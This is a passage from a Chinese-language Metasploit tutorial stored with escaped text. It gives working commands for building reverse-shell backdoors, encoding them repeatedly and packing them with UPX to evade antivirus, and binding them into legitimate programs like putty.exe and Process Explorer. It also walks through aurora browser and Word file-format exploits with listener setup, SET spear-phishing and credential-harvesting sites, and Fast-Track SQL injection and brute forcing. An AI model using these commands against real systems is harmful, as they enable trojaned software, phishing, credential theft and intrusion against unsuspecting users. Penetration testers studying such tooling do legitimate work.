/var/www/payload3.exe\\n```\\n\\n\u7b80\u5355\u7f16\u7801\u88ab\u6740\u673a\u4f1a\u5f88\u5927\uff0c\u4f7f\u7528\u591a\u6b21\u7f16\u7801\u6548\u679c\u66f4\u597d\uff0c\u8fd9\u91cc\u4e00\u5171\u4f7f\u7528\u4e8617\u6b21\u5faa\u73af\u7f16\u7801\u3002\\n\\n\uff08\u9898\u5916\uff1a\u7ecf\u6d4b\u8bd5\uff0c1\uff1a\u4f7f\u7528\u6b64\u547d\u4ee4\u751f\u6210\u7684\u540e\u95e8\u4e5f\u88abMSE\u6740\u5230\uff1b2\uff1a\u672a\u7f16\u7801\u7684\u540e\u95e8\u6216\u7f16\u7801\u6b21\u6570\u8f83\u5c11\u7684\u540e\u95e8\u53ef\u4ee5\u76f4\u63a5\u88ab\u79d2\u6740\uff1b3\uff1awindows/x64/meterpreter/reverse_tcp\u751f\u6210\u7684\u540e\u95e8\u672a\u7ecf\u4efb\u4f55\u5904\u7406\u4ecd\u7136\u4e0d\u88ab\u6740\uff0c\u770b\u6765\u6740\u6bd2\u8f6f\u4ef6\u50bb\u903c\u4e86\uff1b4\uff1ax86\u7f16\u7801\u5668\u7f16\u7801\u7684\u540e\u95e8\u572864\u4f4d\u673a\u5668\u4e0a\u65e0\u6cd5\u6267\u884c\uff1b5\uff1a360\u6709\u4e2a\u6c99\u7bb1\u529f\u80fd\uff0c\u540e\u95e8\u6587\u4ef6\u53f3\u952e\u9009\u62e9\u201c\u5728360\u9694\u79bb\u6c99\u7bb1\u4e2d\u8fd0\u884c\u201d\uff0cmsf\u7167\u6837\u53ef\u4ee5\u8fde\u63a5\u5e76\u64cd\u4f5c\uff0c\u770b\u6765\u9694\u79bb\u6c99\u7bb1\u529f\u80fd\u6709\u9650\u3002\uff09\\n\\n\\n### 4\u3001\u81ea\u5b9a\u4e49\u53ef\u6267\u884c\u7a0b\u5e8f\u6a21\u677f\uff1a\\n\\nmsfencode\u9ed8\u8ba4\u4f7f\u7528data/templates/templates.exe\uff08msf v4\u5728templates\u76ee\u5f55\u4e0b\u6709\u9488\u5bf9\u4e0d\u540c\u5e73\u53f0\u7684\u4e0d\u540c\u6a21\u677f\uff09\u4f5c\u4e3a\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u6a21\u677f\uff0c\u6740\u6bd2\u5382\u5546\u4e5f\u4e0d\u662f\u50bb\u903c\uff0c\u6240\u4ee5\u8fd9\u91cc\u6700\u597d\u4f7f\u7528\u81ea\u5b9a\u4e49\u6a21\u677f\uff0c\u5982\uff1a\\n\\n```\\nwget http://download.sysinternals.com/Files/ProcessExplorer.zip\\ncd work\\nunzip ProcessExplorer.zip\\ncd ..\\nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode \u2013t exe \u2013x work/procexp.exe \u2013o /var/www/pe_backdoor.exe \u2013e x86/shikata_ga_nai \u2013c 5\\n```\\n\\n\u5728\u76ee\u6807\u673a\u5668\u4e0a\u8fd0\u884c\uff0c\u7136\u540e\u672c\u5730\u4f7f\u7528msfcli\u76d1\u542c\u7aef\u53e3\u7b49\u5f85\u53cd\u5f39\u8fde\u63a5\uff1a\\n\\n```\\nmsfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 E\\n```\\n\\n### 5\u3001\u6697\u5ea6\u9648\u4ed3\u2014\u7325\u7410\u6267\u884cpayload\uff1a\\n\\n\u7ed1\u5b9apayload\u81f3\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8ba9\u76ee\u6807\u4e0d\u77e5\u4e0d\u89c9\u95f4\u4e2d\u62db\uff0c\u4ee5putty.exe\u4e3a\u4f8b\uff1a\\n\\n```\\nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode \u2013t exe \u2013x putty.exe -o /var/www/putty_backdoor.exe \u2013e x86/shikata_ga_nai \u2013k \u2013c 5\\n```\\n\\n\u5047\u5982\u9009\u62e9\u4e00\u4e2aGUI\u754c\u9762\u7684\u7a0b\u5e8f\u4f5c\u4e3a\u7ed1\u5b9a\u76ee\u6807\u5e76\u4e14\u4e0d\u4f7f\u7528-k\u9009\u9879\uff0c\u5219\u76ee\u6807\u6267\u884c\u6b64\u7a0b\u5e8f\u7684\u65f6\u5019\u4e0d\u4f1a\u5f39\u51facmd\u7a97\u53e3\uff0c-k\u9009\u9879\u7684\u4f5c\u7528\u662fpayload\u72ec\u7acb\u4e8e\u6a21\u677f\u8f6f\u4ef6\u7684\u8fdb\u7a0b\u8fd0\u884c\u3002\\n\\n\\n### 6\u3001\u52a0\u58f3\uff1a\\n\\nmsfencode\u90e8\u5206\u7f16\u7801\u5668\u4f1a\u589e\u52a0\u7a0b\u5e8f\u4f53\u79ef\uff0c\u8fd9\u65f6\u53ef\u4f7f\u7528\u58f3\uff08packer\uff09\u6765\u538b\u7f29\u7a0b\u5e8f\uff0c\u201c\u5e26\u5957\u4e4b\u540e \u66f4\u4fdd\u9669\u201d\uff0c\u4f8b\u5982UPX \uff1a\\n\\n`apt-get install upx`\\n\\n\u6700\u65b0\u7248\u53ef\u5230sf.net\u4e0b\u8f7d\\n\\n\u4f7f\u7528\u65b9\u6cd5\uff1a\\n\\n`upx -5 /var/www/payload3.exe`\\n\\n\\n\u8fd8\u6709\u53e6\u5916\u4e00\u4e2a\u5de5\u5177msfvenom\u7ed3\u5408\u4e86msfpayload\u548cmsfencode\u7684\u529f\u80fd\uff0c\u4f7f\u7528\u8d77\u6765\u66f4\u7701\u5fc3\uff0c\u4eb2\uff0c\u4e00\u5b9a\u8981\u8bd5\u8bd5\u54e6\uff01\u8fc7\u6740\u8f6f\u603b\u7ed3\u8d77\u6765\u5c31\u662f\u591a\u6b21\u7f16\u7801\u548c\u4f7f\u7528\u591a\u79cd\u58f3\uff0c\u7ec8\u6781\u5927\u6cd5\u5c31\u662f\u4f7f\u7528\u81ea\u5df1\u7f16\u5199\u7684\u540e\u95e8\uff08\u5e02\u9762\u4e0a\u6ca1\u6709\uff0c\u88ab\u6740\u51e0\u7387\u66f4\u4f4e\uff09\u3002\\n\\n\\n## \u516b\uff0e\u4f7f\u7528\u7528\u6237\u7aef\u653b\u51fb\u65b9\u5f0f(client-side attacks)\\n\\n\\n### 1\u3001\u7ec4\u5408\u578b\u653b\u51fb\\n\\n\u4e3b\u8981\u6307\u5229\u7528\u591a\u79cd\u9014\u5f84\u5305\u62ec\u793e\u4f1a\u5de5\u7a0b\u5b66\u65b9\u5f0f\u653b\u51fb\u76ee\u6807\u673a\u5668\u4e0a\u5b89\u88c5\u7684\u5e26\u6709\u6f0f\u6d1e\u7684\u7a0b\u5e8f\u5982\u6d4f\u89c8 \u5668\uff0cpdf\u9605\u8bfb\u5668\uff0coffice\u8f6f\u4ef6\u7b49\uff0c\u6700\u7ec8\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\u3002\\n\\n\\n\u57fa\u4e8e\u6d4f\u89c8\u5668\u7684\u653b\u51fb\uff1a\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmsf> use windows/browser/ms10_002_aurora\\nset payload windows/meterpreter/reverse_tcp\\nset SRVPORT 80\\nset URIPATH /\\nset LHOST 192.168.1.111\\nset LPORT 443\\nexploit \u2013z\\nsessions \u2013i 1\\nrun migrate\\n```\\n\\n\u6216\u8005:\\n\\n```\\nmsf> use windows/browser/ms10_002_aurora\\nshow advanced\\nset ReverseConnectRetries 10\\nset AutoRunScript migrate \u2013f\\nexploit\\nuse priv\\ngetsystem\\n```\\n\\n### 2\u3001\u6587\u4ef6\u683c\u5f0fexploit\\n\\n\\n\u5229\u7528\u6587\u4ef6\u683c\u5f0f\u7684\u6f0f\u6d1e\u8fbe\u5230\u6ea2\u51fa\u7684\u76ee\u7684\uff0c\u6bd4\u5982PDF\uff0cword\uff0c\u56fe\u7247\u7b49\u3002\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\nmsf> use windows/fileformat/ms11_006_createsizeddibsection\\ninfo\\nset payload windows/meterpreter/reverse_tcp\\nset LHOST 192.168.1.111\\nset LPORT 443\\nexploit\\n```\\n\\n\u6b64\u65f6\u4f1a\u751f\u6210\u4e00\u4e2amsf.doc\u7684word\u6587\u6863\uff0c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6253\u5f00\u6b64\u6587\u6863\uff0c\u7136\u540e\u672c\u673a\u76d1\u542c\u7aef\u53e3\u7b49\u5f85\u53cd\u5f39\u8fde\u63a5\uff1a\\n\\n```\\nuse multi/handler\\nset payload windows/meterpreter/reverse_tcp\\nset LHOST 192.168.1.111\\nset LPORT 443\\nexploit \u2013j\\n```\\n\\n## \u4e5d\uff0eMSF \u9644\u52a0\u6a21\u5757\\n\\n\\n\u5305\u62ec\u7aef\u53e3\u626b\u63cf\uff0c\u670d\u52a1\u63a2\u6d4b\uff0c\u5f31\u53e3\u4ee4\u63a2\u6d4b\uff0cfuzzer\uff0csql\u6ce8\u5c04\u7b49\u3002\u9644\u52a0\u6a21\u5757\u6ca1\u6709payload\u3002\\n\u6a21\u5757\u4fdd\u5b58\u5728/opt/framework3/msf3/modules/auxiliary/\u76ee\u5f55\u4e2d\u7684\u5404\u4e2a\u5b50\u76ee\u5f55\u4e0b\u3002\\n\u53ef\u7528\u547d\u4ee4\u67e5\u770b\u5168\u90e8\u53ef\u7528\u9644\u52a0\u6a21\u5757\uff1a`msf> show auxiliary`\\n\\n\u4f8b\u5b50\uff1a\\no```\\nmsf> use scanner/http/webdav_scanner\\ninfo\\nshow options\\nset RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222\\nrun\\n```\\n\\n\u641c\u7d22\u6240\u6709http\u76f8\u5173\u626b\u63cf\u6a21\u5757\uff1a\\n\\n`search scanner/http`\\n\\n\\n\u9644\u52a0\u6a21\u5757\u6df1\u5c42\u5256\u6790\uff1a\\n\\n```\\ncd /opt/framework3/msf3/modules/auxiliary/admin/\\nwget http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb\\n```\\n\\n\u4ee3\u7801\u5206\u6790:\\n\\n```ruby\\nrequire \u2018msf/core\u2019\\nclass Metasploit3 < Msf::Auxiliary #\u5bfc\u5165Auxiliaary\u7c7b\\n#Exploit mixins should be called first\\ninclude Msf::Exploit::Remote::HttpClient #\u5bfc\u5165HTTPClient\u65b9\u6cd5\\ninclude Msf::Auxiliary::Report\\n\\ndef initialize\\n\\nsuper(\\n\u2018Name\u2019 => \u2018Foursquare Location Poster\u2019,\\n\u2018Version\u2019 => \u2018$Revision:$\u2019,\\n\u2018Description\u2019 => \u2018F*ck with Foursquare,be anywhere you want to be by venue id\u2019,\\n\u2018Author\u2019 => [\u2018CG\u2019],\\n\u2018License\u2019 => MSF_LICENSE,\\n\u2018References\u2019 =>\\n[\\n[\u2018URL\u2019,\u2019http://groups.google.com/group/foursquare-api\u2019],\\n[\u2018URL\u2019,\u2019http://www.mikekey.com/im-a-foursquare-cheater/\u2019],\\n]\\n#todo pass in geocoords instead of venueid,create a venueid, other tom foolery\\n\\nregister_options(\\n[\\nOpt::RHOST(\u2018api.foursquare.com\u2019),\\nOptString.new(\u2018VENUEID\u2019,[true,\u2019foursquare venueid\u2019,\u2019185675\u2019]),\\nOptString.new(\u2018USERNAME\u2019,[true,\u2019foursquare username\u2019,\u2019username\u2019]),\\nOptString.new(\u2018PASSWORD\u2019,[true,\u2019foursquare password\u2019,\u2019password\u2019]),\\n],self.class)\\nend\\n\\ndef run\\nbegin\\nuser = datastore[\u2018USERNAME\u2019]\\npass = datasore[\u2018PASSWORD\u2019]\\nvenid = datastore[\u2018VENUEID\u2019]\\nuser_pass = Rex::Text.encode_base64(user + \u201c:\u201d + pass)\\ndecode = Rex::Text.decode_base64(user_pass)\\npostrequest = \u201ctwitter=1\\\\n\u201d #add facebook=1 if you want facebook\\nprint_status(\u201cBase64 Encode User/Pass: #{user_pass}\u201d) #debug\\nprint_status(\u201cBase64 Decode User/Pass: #{decode}\u201d)  #debug\\n\\nres = send_request_cgi({\\n\u2018uri\u2019 => \u201c/v1/checkin?vid=#{venid}\u201d,\\n\u2018version\u2019 => \u201c1.1\u201d,\\n\u2018method\u2019 => \u2018POST\u2019,\\n\u2018data\u2019 => postrequest,\\n\u2018headers\u2019 =>\\n{\\n\u2018Authorization\u2019 => \u201cBasic #{user_pass}\u201d,\\n\u2018Proxy-Connection\u2019 => \u201cKeep-Alive\u201d,\\n}\\n},25)\\n\\nprint_status(\u201c#{res}\u201d)\\nend\\n\\nrescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\\nrescue ::Timeout::Error, ::Errno::EPIPE =>e\\npus e.message\\nend\\nend\\n```\\n\\nruby\u767d\u75f4\u4e00\u4e2a\uff0c\u4ee3\u7801\u6211\u4e5f\u6ca1\u770b\u61c2\uff0c\u4e0d\u89e3\u91ca\u4e86\\n\\n\u5982\u4f55\u4f7f\u7528\uff1a\\n\\n```\\nmsf> search foursquare\\nmsf> use admin/foursquare\\nset VENUEID 2584421\\nset USERNAME msf@elwood.net\\nset PASSWORD ilovemetasploit\\nrun\\n```\\n\\n## \u5341\uff0e\u793e\u4f1a\u5de5\u7a0b\u5b66\u5de5\u5177\u96c6\uff08SET\uff09\\n\\n\u4e3b\u8981\u529f\u80fd\uff1ahacking the human mind\u3002\\n\\n### 1\u3001SET\u57fa\u672c\u914d\u7f6e\uff1a\\n\\nSET\u4f4d\u4e8e/pentest/exploits/set/\u76ee\u5f55\\n\\n\u66f4\u65b0\uff1a\\n\\n```\\ncd /pentest/exploits/set/\\nsvn update\\n```\\n\\n\u914d\u7f6e\u6587\u4ef6config/set_config\uff0c\u5f53\u4f7f\u7528\u57fa\u4e8eweb\u7684\u653b\u51fb\u65b9\u5f0f\u65f6\u53ef\u4ee5\u5c06email\u529f\u80fd\u6253\u5f00\uff1a\\n\\n```\\nvi config/set_config:\\nMETASPLOIT_PATH=/opt/framework3/msf3\\nWEBATTACK_EMAIL=ON\\n```\\n\\n\u4f7f\u7528Java applet attack\u8fdb\u884c\u653b\u51fb\u7684\u65f6\u5019\u9ed8\u8ba4\u4f7f\u7528Microsoft\u4f5c\u4e3a\u53d1\u5e03\u8005\u540d\u79f0\uff0c\u5982\u679c\u9700\u8981\u81ea\u5b9a\u4e49\u5219\u9700\u8981\u5b89\u88c5JDK\u5e76\u6253\u5f00\u914d\u7f6e\u9879\uff1a\\n\\n`SELF_SIGNED_APPLET=ON`\\n\\nSET\u9ed8\u8ba4\u6253\u5f00AUTO_DETECT\u9879\uff0c\u81ea\u52a8\u63a2\u6d4b\u672c\u673aIP\u5e76\u7528\u4e8e\u653b\u51fb\u4e2d\u7684\u5404\u9879\u914d\u7f6e\u3002\u5982\u679c\u672c\u673a\u662f\u591a\u7f51\u5361\u9700\u8981\u624b\u52a8\u6307\u5b9aIP\uff0c\u5219\u9700\u5c06\u6b64\u9879\u5173\u95ed\uff1a\\n\\n`AUTO_DETECT=OFF`\\n\\nSET\u9ed8\u8ba4\u4f7f\u7528\u5185\u5efa\u7684python\u63d0\u4f9b\u7684web server\u4f9b\u4f7f\u7528\uff0c\u5982\u9700\u4f7f\u7528apache\u4f5c\u4e3a\u670d\u52a1\u5219\u9700\u8981\u672c\u673a\u5b89\u88c5apache\u5e76\u6253\u5f00\u914d\u7f6e\u9879\uff1a\\n\\n`APACHE_SERVER=ON`\\n\\n\\n### 2\u3001\u7f51\u7edc\u9493\u9c7c\u653b\u51fb:\\nSpear-Phishing Attack Vector,\u5229\u7528\u6587\u4ef6\u683c\u5f0f\u6f0f\u6d1e\uff08\u5982PDF\uff09\u7b49\u751f\u6210\u540e\u95e8\u5e76\u901a\u8fc7email\uff08GMAIL,SENDMAIL,\uff09\u5411\u76ee\u6807\u53d1\u9001\u5e26\u540e\u95e8\u9644\u4ef6\u7684\u7535\u5b50\u90ae\u4ef6\uff0c\u8bf1\u4f7f\u76ee\u6807\u6253\u5f00\u9644\u4ef6\u6fc0\u6d3b\u540e\u95e8\u3002\\n\\n\u4f8b\u5b50\uff1a\\n\\n```\\n./set\\n\u6b64\u65f6\u9009\u62e9\u83dc\u53551.Spear-Phishing Attack Vectors\\n\u7ee7\u7eed\u9009\u62e9\uff1a1.Perform a Mass Email Attack\\n\u9009\u62e9exploit\uff1a8.Adobe Collab.collectEmailInfo Buffer Overflow\\n\u9009\u62e9payload\uff1a4.Windows Reverse TCP Shell\\n\u9009\u62e9\u662f\u5426\u66f4\u6539\u6587\u4ef6\u540d\uff1a1.Keep the filename\\n\u9009\u62e9\u53d1\u9001\u90ae\u4ef6\u65b9\u5f0f1.Email Attack Single Email Address\\n\u9009\u62e9\u90ae\u4ef6\u6a21\u677f1.Pre-Defined Template\\n5.Status Report\\n\u8f93\u5165\u6536\u4ef6\u65b9email\u5730\u5740\uff1awebmanager@exmaple.com\\n\u9009\u62e9\u53d1\u4ef6\u65b9\u5f0f\uff1a1.Use a GMAIL Account for your email attack\\n\u8f93\u5165\u53d1\u4ef6gmail\u548c\u5bc6\u7801\\n\u9009\u62e9\u662f\u5426\u7acb\u5373\u76d1\u542c\u7aef\u53e3\u7b49\u5f85\u8fde\u63a5:yes\\n```\\n\u6b64\u65f6SET\u4f1a\u4f7f\u7528\u521a\u624d\u7684\u8bbe\u5b9a\u5168\u81ea\u52a8\u76d1\u542c\u6307\u5b9a\u7aef\u53e3\u3002\\n\\n### 3\u3001WEB\u65b9\u5f0f\u653b\u51fb\uff1a\\n\\nSET\u53ef\u4ee5\u514b\u9686\u4e00\u4e2a\u7f51\u7ad9\u5e76\u690d\u5165\u540e\u95e8\u4ee5\u6b64\u8ff7\u60d1\u76ee\u6807\u6253\u5f00\u6b64\u7f51\u7ad9\u5e76\u4e2d\u62db\u3002\\n\\n- Java Applet\u65b9\u5f0f\uff1a\u6700\u6210\u529f\u7684\u65b9\u5f0f\u4e4b\u4e00\uff0c\u5e76\u4e0d\u662f\u5229\u7528java\u7684\u6f0f\u6d1e\uff0c\u800c\u662f\u5f53\u76ee\u6807\u6d4f\u89c8\u542b\u540e\u95e8\u7684\u4eff\u5192\u7ad9\u70b9\u65f6\u4f1a\u88ab\u8be2\u95ee\u662f\u5426\u5141\u8bb8\u6267\u884cweb\u4e2d\u7684java applet\uff0c\u4e00\u65e6\u70b9\u51fb\u5141\u8bb8\u5219payload\u5f00\u59cb\u8fd0\u884c\uff0c\u76ee\u6807\u5c06\u88ab\u91cd\u5b9a\u5411\u5230\u771f\u5b9e\u7684\u7f51\u7ad9\u3002\\n- \u7528\u6237\u7aef\uff08Client-side\uff09web exploit\u65b9\u5f0f\uff1a\u5229\u7528\u7528\u6237\u7aef\u5b58\u5728\u7684\u8f6f\u4ef6\u6f0f\u6d1e\uff0c\u4e00\u822c\u4f7f\u75280day\u8fdb\u884c\u653b\u51fb\u7684\u6548\u679c\u6700\u597d\u3002\\n- \u8d26\u53f7\u5bc6\u7801\u83b7\u53d6\uff08Username and Password Harvesting\uff09\uff1a\u901a\u8fc7\u514b\u9686\u4e00\u4e2a\u76ee\u6807\u7ad9\u5e76\u8bf1\u4f7f\u653b\u51fb\u76ee\u6807\u767b\u9646\uff0c\u622a\u83b7\u5176\u8d26\u53f7\u5bc6\u7801\u3002\u4f8b\u5982\u622a\u83b7GMAIL\u5bc6\u7801\u3002\\n- \u6807\u7b7e\u9875\u7ed1\u67b6\uff08Tabnabbing\uff09\uff1a\u5f53\u76ee\u6807\u6253\u5f00\u591a\u4e2a\u6807\u7b7e\u9875\u6d4f\u89c8\u7f51\u7ad9\u5e76\u5207\u6362\u6807\u7b7e\u9875\u65f6\uff0c\u7f51\u7ad9\u4fa6\u6d4b\u5230\u76ee\u6807\u7684\u884c\u4e3a\u5e76\u663e\u793a\u8ba9\u76ee\u6807\u7b49\u5f85\u7684\u4fe1\u606f\uff0c\u6070\u597d\u76ee\u6807\u6253\u5f00\u4e86\u88ab\u7ed1\u67b6\u7684\u6807\u7b7e\u9875\u5e76\u8981\u6c42\u5728\u76f8\u4f3c\u7a0b\u5ea6\u60ca\u4eba\u7684\u7f51\u7ad9\u91cc\u8f93\u5165\u767b\u9646\u51ed\u636e\uff0c\u5f53\u76ee\u6807\u8f93\u5165\u4e4b\u540e\u767b\u9646\u4fe1\u606f\u5373\u88ab\u622a\u83b7\uff0c\u540c\u65f6\u88ab\u91cd\u5b9a\u5411\u5230\u771f\u5b9e\u7f51\u7ad9\u3002\\n- \u4e2d\u95f4\u4eba\u653b\u51fb\uff08Man-Left-in-the-Middle\uff09\uff1a\u6b64\u65b9\u5f0f\u4f7f\u7528\u5df2\u7ecf\u88ab\u653b\u9677\u7684\u7f51\u7ad9\u7684HTTP\u8bf7\u6c42\u6216\u8005\u7f51\u7ad9\u7684XSS\u6f0f\u6d1e\u8ba9\u7528\u6237\u7684\u767b\u9646\u4fe1\u606f\u53d1\u9001\u81f3\u653b\u51fb\u8005\u7684HTTP\u670d\u52a1\u5668\u3002\u5982\u679c\u4f60\u53d1\u73b0\u4e86\u4e00\u4e2a\u7f51\u7ad9\u7684XSS\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u6784\u9020\u4e00\u4e2aurl\u53d1\u9001\u7ed9\u76ee\u6807\u8bf1\u4f7f\u5176\u6253\u5f00\u5e76\u767b\u9646\u4ee5\u622a\u83b7\u767b\u9646\u4fe1\u606f\u3002\\n- Web Jacking\uff1a\u5f53\u76ee\u6807\u6253\u5f00\u6211\u4eec\u7684\u7f51\u7ad9\u65f6\u4f1a\u6709\u4e00\u4e2a\u94fe\u63a5\u663e\u793a\u4e3a\u6b63\u786e\u7684web\u5730\u5740\uff0c\u6b64\u65f6\u82e5\u76ee\u6807\u6253\u5f00\u6b64\u4eff\u5192\u94fe\u63a5\u4f1a\u88ab\u5b9a\u5411\u5230\u6211\u4eec\u7684\u4eff\u5192\u7f51\u7ad9\uff0c\u5176\u767b\u9646\u4fe1\u606f\u4f1a\u88ab\u622a\u83b7\u3002\\n- \u6df7\u5408\u6a21\u5f0f\uff08multi-attack\uff09\uff1a\u53ef\u540c\u65f6\u4f7f\u7528\u4ee5\u4e0a\u591a\u79cd\u653b\u51fb\u624b\u6bb5\u4ee5\u63d0\u9ad8\u6210\u529f\u7387\u3002\\n- \u4ecb\u8d28\u611f\u67d3\u653b\u51fb\uff08Infectious Media Generator\uff09\uff1a\u53ef\u4ee5\u8ba9\u4f60\u751f\u6210\u4e00\u5f20\u5149\u76d8\u6216\u8005u\u76d8\uff0c\u91cc\u9762\u5305\u542bautorun.inf\u6765\u8fd0\u884c\u6307\u5b9a\u7684\u540e\u95e8\u6587\u4ef6\u6216\u8005file-format\u6f0f\u6d1e\u6587\u4ef6\u3002\\n- \u8ff7\u4f60USB\u4eba\u673a\u63a5\u53e3\u8bbe\u5907\uff08Teensy USB HID\uff09\uff1a\u5f53\u7535\u8111\u63d2\u5165USB\u8bbe\u5907\u4e14autorun.inf\u88ab\u7981\u7528\u65f6\uff0c\u53ef\u4f7f\u7528\u6b64\u65b9\u6cd5\u5c06USB\u8bbe\u5907\u6a21\u62df\u6210\u4e00\u4e2a\u952e\u76d8\u6216\u9f20\u6807\u8bbe\u5907\uff0c\u8fdb\u800c\u622a\u83b7\u76ee\u6807\u673a\u5668\u7684\u51fb\u952e\u8bb0\u5f55\u3002\\n\\n\\n### SET\u5176\u4ed6\u7279\u6b8a\u529f\u80fd\uff1a\\n\\n\u5305\u62ecSET\u4ea4\u4e92\u5f0fshell\uff0c\u53ef\u7528\u6765\u66ff\u4ee3meterpreter\uff1b\u8fdc\u7a0b\u7ba1\u7406\u5de5\u5177\uff08RATTE\uff09\uff1bHTTP\u96a7\u9053\uff0c\u5f53\u76ee\u6807\u4e3b\u673a\u53ea\u5f00\u653eHTTP\u7aef\u53e3\u5bf9\u5916\u653e\u884c\u65f6\u53ef\u901a\u8fc7\u6b64\u529f\u80fd\u4e0e\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\uff1bWEB-GUI\uff0c\u5305\u542b\u4e86\u5e38\u7528\u653b\u51fb\u548c\u65e0\u7ebf\u653b\u51fb\u5411\u5bfc\uff0c\u8f93\u5165./set-web\u5373\u53ef\u8fd0\u884c\u3002\\n\\n\uff08SET\u65b0\u7248\u672c\u53d8\u52a8\u8f83\u5927\uff0c\u8bf7\u81ea\u884c\u6478\u7d22\u3002\uff09\\n\\n## \u5341\u4e00\uff0eFAST-TRACK\\n\\nFast-Track\u548cSET\u4e00\u6837\u90fd\u662fpython\u7f16\u5199\u7684\uff0c\u540c\u6837\u662f\u4f7f\u7528MSF\u63d0\u4f9b\u7684payload\u4ee5\u53ca\u7528\u6237\u7aef\u653b\u51fb\u5411\u5bfc\u7b49\uff0c\u4f5c\u4e3a\u5bf9MSF\u7684\u8865\u5145\uff0c\u5b83\u63d0\u4f9b\u4e86\u5982MSSQL\u653b\u51fb\uff0c\u66f4\u591a\u7684exploit\uff0c\u6d4f\u89c8\u5668\u653b\u51fb\u5411\u5bfc\u7b49\u3002fasttrack\u4f4d\u4e8e/pentest/exploits/fasttrack/\u3002\\n\\n\u4ea4\u4e92\u5f0f\u6a21\u5f0f\uff1a`./fast-track.py -i`\\n\\n\u547d\u4ee4\u884c\u6a21\u5f0f\uff1a`./fast-track.py -c`\\n\\nWeb\u754c\u9762\u6a21\u5f0f\uff1a`./fast-track.py -g`\\n\\n\\n### 1\u3001MSSQL\u5de5\u5177\uff1a\\n\\nMSSQL\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\uff1a\\n\\n\u653b\u51fb\u65f6\u4f60\u53ea\u9700\u8981\u8f93\u5165\u6709\u6ce8\u5165\u6f0f\u6d1e\u7684url\u5730\u5740\uff0c\u5730\u5740\u91cc\u9762\u7528INJECTHERE\u6807\u8bc6\u53ef\u6ce8\u5165\u5b57\u6bb5\uff0c\u5982http://example.com/show.asp?id=INJECTHERE&date=2012\uff0cfast-track\u4f1a\u5168\u81ea\u52a8\u6ce8\u5165\uff0c\u4e00\u65e6\u6210\u529f\u4f1a\u7ed9\u4f60\u8fd4\u56de\u4e00\u4e2acmd shell\u3002\\n\u6ce8\u5165\u4e5f\u652f\u6301POST\u53c2\u6570\uff0c\u5982\u679c\u662fPOST\u7684\u8bdd\u66f4\u52a0\u7b80\u5355\uff0c\u53ea\u9700\u8981\u4f60\u8f93\u5165url\u5730\u5740\uff0cfast-track\u4f1a\u81ea\u52a8\u5224\u65ad\u5e76\u5c1d\u8bd5\u8fdb\u884c\u6ce8\u5165\u3002\\n\\n\\nSQL\u66b4\u529b\u7834\u89e3\uff1a\u53e6\u5916\u4e00\u4e2a\u5b9e\u7528\u7684\u529f\u80fd\u662f\u66b4\u529b\u7834\u89e3\u5668\uff08MSSQL Bruter\uff09\uff0c\u53ef\u4ee5\u5bfb\u627emssql\u5f31\u53e3\u4ee4\uff0c\u4e00\u65e6\u83b7\u53d6\u5230\u4e00\u4e2asa\u6743\u9650\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u5c06\u81ea\u52a8\u8fd4\u56de\u4e00\u4e2ashell\u3002\\n\\nSQL\u6ce8\u5165\u6279\u91cf\u626b\u63cf\u5668\uff08SQLPwnage\uff09\uff1a\u6b64\u529f\u80fd\u53ef\u626b\u63cf\u6307\u5b9a\u7f51\u6bb5\u7684\u6240\u6709\u6253\u5f0080\u7aef\u53e3\u7684\u4e3b\u673a\uff0c\u5e76\u626b\u63cf\u662f\u5426\u5b58\u5728sql\u6ce8\u5165\u70b9\uff0c\u4e00\u65e6\u53d1\u73b0\u6ce8\u5165\u70b9\u5c06\u81ea\u52a8\u5c1d\u8bd5\u653b\u51fb\u5e76\u901a\u8fc7xp_cmdshell\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\u3002\\n\\n\\n### 2\u3001Binary-HEX \u8f6c\u6362\u5668\uff1a\\n\\n\u5f53\u4f60\u5df2\u7ecf\u8fdb\u5165\u4e00\u4e2a\u7cfb\u7edf\u4e14\u9700\u8981\u4e0a\u4f20\u53ef\u6267\u884c\u6587\u4ef6\u4e0a\u53bb\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u5de5\u5177\u5c06\u53ef\u6267\u884c\u7684\u4e8c \u8fdb\u5236\u6587\u4ef6\u8f6c\u6362\u4e3aHEX\u5341\u516d\u8fdb\u5236\u7f16\u7801\uff0c\u7136\u540e\u590d\u5236\u7c98\u8d34\u8fc7\u53bb\u5373\u53ef\u3002\\n\\n### 3\u3001\u6279\u91cf\u7528\u6237\u7aef\u653b\u51fb\uff1a\\n\\n\u548c\u6d4f\u89c8\u5668\u653b\u51fb\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u589e\u52a0\u4e86\u5bf9\u76ee\u6807\u7684ARP\u7f13\u51b2\u533a\u548cDNS\u611f\u67d3\uff08\u53ea\u80fd\u662f\u5728\u6d4b\u8bd5\u8005 \u548c\u76ee\u6807\u5904\u4e8e\u540c\u4e00\u7f51\u6bb5\u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u4ee5\u53caMSF\u91cc\u9762\u6ca1\u6709\u7684\u6d4f\u89c8\u5668\u6ea2\u51faexploit\u3002\u5f53\u76ee\u6807\u6d4f\u89c8 \u6076\u610f\u7f51\u7ad9\u7684\u65f6\u5019\uff0cfast-track\u5c1d\u8bd5\u7740\u4f7f\u7528\u6240\u6709\u7684exp\u5bf9\u76ee\u6807\u673a\u5668\u8fdb\u884c\u6ea2\u51fa\uff0c\u4e00\u65e6\u67d0\u4e2aexp 